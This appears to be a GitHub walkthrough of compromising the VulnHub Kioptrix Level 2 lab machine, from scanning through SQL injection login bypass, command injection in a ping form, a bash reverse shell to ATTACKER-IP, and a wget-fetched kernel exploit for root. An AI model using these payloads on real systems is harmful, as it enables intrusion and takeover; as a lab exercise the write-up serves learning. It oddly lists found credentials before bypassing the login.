# 🚀 Kioptrix Level 2 Walkthrough (VulnHub)

> Complete walkthrough of compromising the Kioptrix Level 2 machine from initial reconnaissance to full root access.


# 📌 Machine Information

| Category   | Details            |
| ---------- | ------------------ |
| Machine    | Kioptrix Level 2   |
| Platform   | VulnHub            |
| Difficulty | Beginner           |
| Target OS  | CentOS 4.5         |
| Goal       | Obtain Root Access |

---

# 🎯 Objective

The objective of this assessment was to identify vulnerabilities within the target machine and demonstrate a complete attack path from reconnaissance to root compromise.

---

# 🔍 Reconnaissance

## Host Discovery

Using ARP Scan to identify live hosts on the network.

```bash
sudo arp-scan -l
```

### Result

```text
192.168.10.8
```

📸 Screenshot:

```text
screenshots/01-host-discovery.png
```

---

# 🌐 Port Scanning & Service Enumeration

## Nmap Scan

A full TCP scan was performed to identify exposed services and operating system details.

```bash
nmap -sS -sV -O -p- 192.168.10.8
```

### Results

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 3.9p1 |
| 80   | HTTP    | Apache 2.0.52 |
| 111  | RPCBind | RPC #100000   |
| 443  | HTTPS   | Apache 2.0.52 |
| 631  | IPP     | CUPS 1.1      |
| 776  | Status  | RPC #100024   |
| 3306 | MySQL   | Unauthorized  |

### OS Detection

```text
Linux 2.6.x
CentOS 4.5
```

### Key Findings

* Outdated Apache 2.0.52 detected.
* Exposed MySQL service.
* Multiple RPC services available.
* Legacy Linux kernel version.

📸 Screenshot:
https://github.com/Salik921/-Kioptrix-Level-2-Walkthrough-VulnHub-/blob/6a57637e85b74a903397398ece07db6835ff947c/Screenshot%202026-06-02%20105408.png

---

# 🔎 Vulnerability Research

Apache version enumeration revealed an outdated web server version.

```bash
searchsploit Apache 2.0.52
```

Several public vulnerabilities were identified for Apache 2.0.52.

📸 Screenshot:

```text
https://github.com/Salik921/-Kioptrix-Level-2-Walkthrough-VulnHub-/blob/6a57637e85b74a903397398ece07db6835ff947c/Screenshot%202026-06-02%20110312.png
```

---

# 💉 SQL Injection Authentication Bypass

During assessment of the web application login portal, authentication mechanisms were tested for injection vulnerabilities.

## Login Portal

```text
Remote System Administration
```

Valid credentials were identified:

```text
Username: admin
Password: admin1234
```

The login request was intercepted using Burp Suite and sent to Intruder for payload testing.

---

## Burp Suite Request Interception

The authentication request was captured and modified to test SQL Injection payloads.

## Intruder Attack

Several payloads were tested:

```sql
admin'--
admin'#
admin' or '1'='1
admin') or ('1'='1
```

📸 Screenshot:

```text
https://github.com/Salik921/-Kioptrix-Level-2-Walkthrough-VulnHub-/blob/6a57637e85b74a903397398ece07db6835ff947c/Screenshot%202026-06-02%20110831.png
```

---

## Successful Payload

```sql
admin' or '1'='1
```

### Result

Authentication was successfully bypassed.

The application returned:

```text
Welcome to the Basic Administrative Web Console
```

This confirmed a SQL Injection vulnerability leading to authentication bypass.

📸 Screenshot:

```text
https://github.com/Salik921/-Kioptrix-Level-2-Walkthrough-VulnHub-/blob/6a57637e85b74a903397398ece07db6835ff947c/Screenshot%202026-06-02%20110856.png
```

---

# 🖥️ Administrative Console Access

After successful authentication bypass, access was obtained to the administrative panel.

### Functionality Discovered

```text
Ping a Machine on the Network
```

This feature became the primary target for further testing.

📸 Screenshot:

```text

```

---

# 💻 Command Injection

The Ping functionality was tested for command injection vulnerabilities.

### Test Payload

```bash
127.0.0.1;id
```

### Result

The server executed arbitrary operating system commands.

This confirmed a Command Injection vulnerability.

📸 Screenshot:

```text
screenshots/08-command-injection.png
```

---

# 🐚 Reverse Shell

## Netcat Listener

Attacker Machine:

```bash
nc -lvnp 3000
```

## Reverse Shell Payload

```bash
127.0.0.1;bash -i >& /dev/tcp/ATTACKER-IP/3000 0>&1
```

### Shell Access Obtained

```bash
id
```

Output:

```text
uid=48(apache) gid=48(apache)
```

📸 Screenshot:

```text
screenshots/09-reverse-shell.png
```

---

# ⬆️ Privilege Escalation

## System Information

```bash
cat /etc/*-release
```

Output:

```text
CentOS release 4.5 (Final)
```

📸 Screenshot:

```text
screenshots/10-os-information.png
```

---

## Hosting Exploit

Attacker Machine:

```bash
python -m http.server 80
```

📸 Screenshot:

```text
screenshots/11-python-server.png
```

---

## Exploit Transfer

Target Machine:

```bash
cd /var/tmp
wget http://ATTACKER-IP/9542.c
```

Compile:

```bash
gcc 9542.c -o exploit
```

Execute:

```bash
chmod +x exploit
./exploit
```

📸 Screenshot:

```text
screenshots/12-privesc-exploit.png
```

---

# 👑 Root Access

Verification:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

🎉 Root shell successfully obtained.

📸 Screenshot:

```text
screenshots/13-root-proof.png
```

---

# 🔗 Attack Path

```text
Reconnaissance
      ↓
Port Enumeration
      ↓
Apache Version Discovery
      ↓
SQL Injection Authentication Bypass
      ↓
Admin Panel Access
      ↓
Command Injection
      ↓
Reverse Shell
      ↓
Privilege Escalation
      ↓
ROOT
```

---

# 🛠 Tools Used

* Nmap
* ARP Scan
* Burp Suite
* Searchsploit
* Netcat
* GCC
* Python HTTP Server
* Linux Utilities

---

# 📚 Skills Practiced

* Information Gathering
* Service Enumeration
* Vulnerability Research
* SQL Injection
* Authentication Bypass
* Burp Suite Intruder
* Command Injection
* Reverse Shells
* Linux Privilege Escalation
* Post Exploitation

---

# 🏁 Conclusion

The Kioptrix Level 2 machine was successfully compromised through a chain of vulnerabilities including SQL Injection, Command Injection, and Local Privilege Escalation.

This exercise provided practical experience in web application exploitation, service enumeration, shell access, and privilege escalation techniques commonly encountered during penetration testing engagements.

✅ Authentication Bypass Achieved

✅ Command Execution Achieved

✅ Reverse Shell Obtained

✅ Root Access Obtained

---

## Disclaimer

This walkthrough was performed in a controlled lab environment for educational and authorized security testing purposes only.
